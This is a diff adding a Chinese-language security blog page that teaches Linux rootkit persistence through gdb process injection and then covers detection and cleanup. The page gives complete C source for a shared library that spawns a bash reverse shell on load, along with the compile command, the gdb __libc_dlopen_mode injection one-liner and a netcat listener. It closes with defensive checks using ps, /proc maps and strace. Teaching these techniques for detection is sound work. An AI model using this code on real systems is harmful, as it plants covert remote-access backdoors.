@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<head>
+
+	<title>poions blog</title>
+	<meta name="keywords" content="" />
+	<meta name="description" content="" />
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<link href="/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/templatemo_style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+	<div class="templatemo-logo visible-xs-block">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg logo-left-container">
+			<h1 class="logo-left">Black</h1>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg logo-right-container">
+			<h1 class="logo-right">White</h1>
+		</div>
+	</div>
+	<div class="templatemo-container">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg left-container">
+			<h1 class="logo-left hidden-xs margin-bottom-60">Black</h1>
+			<div class="tm-left-inner-container">
+				<ul class="nav nav-stacked templatemo-nav">
+				  <li><a href="\index.html"><i class="fa fa-home fa-medium"></i>首页</a></li>
+				  <li><a href="\web.html" class="active"><i class="fa fa-shopping-cart fa-medium"></i>安全攻防</a></li>
+				  <li><a href="\ctf.html"><i class="fa fa-send-o fa-medium"></i>CTF</a></li>
+				  <li><a href="\zawen.html"><i class="fa fa-comments-o fa-medium"></i>杂文</a></li>
+				  <li><a href="\contact.html"><i class="fa fa-envelope-o fa-medium"></i>联系方式</a></li>
+				</ul>
+			</div>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg right-container">
+			<h1 class="logo-right hidden-xs margin-bottom-60">White</h1>
+			<div class="tm-right-inner-container">
+				<h1 class="templatemo-header"><strong>Linux Rootkit 的利用教程与检测（gdb进程注入）</strong></h1>
+				<article class="templatemo-item">
+				 </br>
+				<h1 class="templatemo-header"><strong>0x01 题外话</strong></h1>
+				<span>
+					<strong>
+				<font face="verdana" color="green">
+				这是一篇过了很久很久才发表的博客文章，在编辑上传该文章的时候发现已经快3年没有更新过博文了，真实懒得可以的.😂
+				</font>
+				</strong>
+			</br>
+			<br />
+			<br />
+			<hr/>
+
+
+		<h1 class="templatemo-header"><strong>0x02 背景</strong></h1>
+		<strong>
+			在Linux 系统环境里面，一般攻击者成功入侵至系统之后后续的工作便是会将恶意的进程木马隐匿或者通过各种手段守护起来避免很轻易的被发现以及干掉，这种方式称之为Rootkit；
+			下面便介绍在Linux系统下面进行Rootkit的其中一种方式与检测它的方式。
+		</strong>
+			<img src="images\2021042701.png" alt="frist" class="img-thumbnail">
+
+			<hr/>
+			
+			
+			<h1 class="templatemo-header"><strong>0x03 GDB进程注入</strong></h1>
+			<p>通过利用系统工具GDB，把编译好的动态链接库文件注入到指定的进程下面；首先编译exp源码如下:</p>
+			<pre>
+#include <pthread.h>
+#include <stdlib.h>
+#include <unistd.h>
+#define SLEEP  120                    /* Time to sleep between callbacks */
+#define CBADDR "127.0.0.1"           /* Callback address */
+#define CBPORT "4444"                 /* Callback port */
+/* Reverse shell command */
+#define CMD "echo 'exec >&/dev/tcp/"\
+			CBADDR "/" CBPORT "; exec 0>&1' | /bin/bash"
+void *callback(void *a);
+	__attribute__((constructor)) /* Run this function on library load */
+void start_callbacks(){
+	pthread_t tid;
+	pthread_attr_t attr;
+	/* Start thread detached */
+	if (-1 == pthread_attr_init(&attr)) {
+		return;
+	}
+	if (-1 == pthread_attr_setdetachstate(&attr,
+	PTHREAD_CREATE_DETACHED)) {
+		return;
+	}
+	/* Spawn a thread to do the real work */
+	pthread_create(&tid, &attr, callback, NULL);
+}
+/* callback tries to spawn a reverse shell every so often.  */
+void *
+callback(void *a)
+	{
+		for (;;) {
+		/* Try to spawn a reverse shell */
+		system(CMD);
+		/* Wait until next shell */
+		sleep(SLEEP);
+	}
+	return NULL;
+}
+				</pre>
+			<p>首先，需要寻找一个看上去不会被怀疑是恶意木马的进程，获取它的pid,通过执行ps：</p>
+			<pre>ps -fxo pid,user,args | egrep -v ' \[\S+\]$'</pre>
+			<p>例如，对这个进程进行注入</p>
+			<img src="images\2021042706.png" alt="frist" class="img-thumbnail">
+			<p>然后使用: <pre>gcc -O2 -fPIC -o /opt/exploit/libcallback.so ./exploit.c -lpthread -shared </pre>	对exp进行编译</p>
+			<img src="images\2021042702.png" alt="frist" class="img-thumbnail">
+			<p>完成编译后，需要选择一个已存在的进程，获取pid号，最后利用gdb对其进行注入动态链接库;</p>
+			<pre>注入命令: echo 'print __libc_dlopen_mode("/opt/exploit/libcallback.so", 2)' | gdb -p "xxxpid_number"</pre>
+			<img src="images\2021042703.png" alt="frist" class="img-thumbnail">
+			<br>
+			<img src="images\2021042704.png" alt="frist" class="img-thumbnail">
+			<p>完成注入后，通过nc -lvp 4444监听至反弹shell的端口便可以获取到反弹回来的shell连接</p>
+			<img src="images\2021042705.png" alt="frist" class="img-thumbnail">
+			<p>最终完成进入注入,从服务端机器获取连接过来的shell</p>
+			<img src="images\2021042707.png" alt="frist" class="img-thumbnail">
+
+			<hr/>
+			
+			<h1 class="templatemo-header"><strong>0x04 检测方式</strong></h1>	
+			<p>通过ps auxffw 打印进程看</p>
+			<p><pre>/usr/sbin/lvmetad -f </pre>
+				进程下面成功注入了通过调用bash 执行反弹shell的动作
+			</p>
+			<img src="images\2021042708.png" alt="frist" class="img-thumbnail">
+			<p>如果是以反弹shell的方式注入到进程里面很容易就会被通过ps等打印进程信息的方式发现攻击；
+				因此转换思路，如果注入的并非是需要调用到bash来执行，因此目前大部分木马是利用该方式来对其他进行进行守护，守护挖矿进程等，例如： 
+				<pre>/usr/sbin/lvmetad -f
+	\_ /bin/miner
+				</pre>
+				安全管理人员则需要去判断/bin下面的miner是否是恶意进程，如果系统是存在大量的进程子进程，那么工作量也会随之增加。
+				检测方式： ps依靠安全经验分析子进程下面是否是恶意的进程应用、或者查看netstat 连接情况是否包含恶意外连。
+				
+			</p>
+			<img src="images\2021042709.png" alt="frist" class="img-thumbnail">
+			<p>通过查看进程maps获取其加载的动态链接库情况分析</p>
+			<p>从上面截图可以看到进程已经被加载了恶意的动态链接库;当我们把注入的恶意动态链接库的文件给删掉时，被注入的进程maps里面可以看到出现(deleted) 字样</p>
+			<img src="images\2021042716.png" alt="frist" class="img-thumbnail">
+			<p>虽然把恶意的动态链接库删除，但是依然还会触发我们的反弹shell；因为该动作已经被注入进了父进程内存中,通过strace查看服务进程:</p>
+			<img src="images\2021042718.png" alt="frist" class="img-thumbnail">
+			<p>可以看到，虽然恶意的动态链接库文件已被清除，但依然还会触发反弹shell; 假设木马被注入到了高权限低位PID进程清理难度和隐匿效果会大幅上升</p>
+
+			<hr/>
+
+			<h1 class="templatemo-header"><strong>0x05 清理方式</strong></h1>
+			<p>通过命令直接干掉反弹shell进程</p>
+			<img src="images\2021042710.png" alt="frist" class="img-thumbnail">
+			<p>需要注意的是在反弹shell进程下面还有一个/bin/bash的进程，也需要干掉,不然反弹出去的会话依然不会结束掉！</p>
+			<img src="images\2021042711.png" alt="frist" class="img-thumbnail">
+			<br>
+			<img src="images\2021042712.png" alt="frist" class="img-thumbnail">
+			<p>干掉后,会话也会结束</p>
+			<img src="images\2021042713.png" alt="frist" class="img-thumbnail">
+			<br>
+			<img src="images\2021042714.png" alt="frist" class="img-thumbnail">
+			<p>在确保把动态链接文件清楚干净后，还得重启被注入的服务进程；不然依然还会触发木马</p>
+			<p>利用strace 来监控指定进程的网络、文件操控情况，来捕获注入的恶意木马动作</p>
+			<pre>strace -tt -q -f -e trace=network -p 35466
+strace -tt -q -f -e trace=file -p 35466</pre>
+			<img src="images\2021042717.png" alt="frist" class="img-thumbnail">
+			<p>谢谢观看!</p>
+			<hr/>
+
+			</br>
+			</br>
+						by<span class="blue">：2021年4月27号</span><span class="green">16:42</span>.</p>
+				<br/>
+
+
+
+		<!-- 文章修改 -->
+
+
+			</span>
+			</article>
+				</footer>
+			</div>
+		</div> <!-- right section -->
+	</div>
+</body>
+</html>
